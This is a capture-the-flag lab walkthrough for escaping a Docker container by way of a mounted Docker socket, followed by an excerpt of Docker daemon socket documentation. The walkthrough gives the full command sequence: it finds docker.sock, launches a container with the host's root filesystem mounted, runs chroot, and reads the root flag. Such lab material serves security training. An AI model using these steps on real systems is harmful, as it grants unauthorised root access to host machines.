Name: Mounted Docker Socket
Objective: Leverage the mounted Docker socket to get access to the host machine and retrieve
the flag stored in the root directory of the host system!

pre-req : create container using DOcker file in current directory

Step 1: Search for docker socket.
Command: find / -name docker.sock 2>/dev/null

By default docker client is configured to use /var/run/docker.sock unix socket which is a symlink
to /run/docker.sock.
Step 2: Docker client is installed on the docker container. Check the images available on the
local machine.
Command: docker images

Step 3: Start an Ubuntu container. Mount root directory of host machine on /host directory of the
container.
Command: docker run -it -v /:/host/ ubuntu:18.04 bash

Step 4: Change to /host directory and list the files.
Commands:
cd /host/
ls -l

Step 5: Use chroot on the /host directory.
Command: chroot ./ bash

Step 6: Retrieve the flag
Commands:
find / -name flag 2>/dev/null
cat /root/flag







Daemon socket option

The Docker daemon can listen for Docker Engine API requests via three different types of Socket: unix, tcp, and fd.

By default, a unix domain socket (or IPC socket) is created at /var/run/docker.sock, 
requiring either root permission, or docker group membership.

If you need to access the Docker daemon remotely, you need to enable the tcp Socket. 
Beware that the default setup provides un-encrypted and un-authenticated direct access to the Docker daemon - and should be secured either using the built in HTTPS encrypted socket, or by putting a secure web proxy in front of it. You can listen on port 2375 on all network interfaces with -H tcp://0.0.0.0:2375, or on a particular network interface using its IP address: -H tcp://192.168.59.103:2375. It is conventional to use port 2375 for un-encrypted, and port 2376 for encrypted communication with the daemon.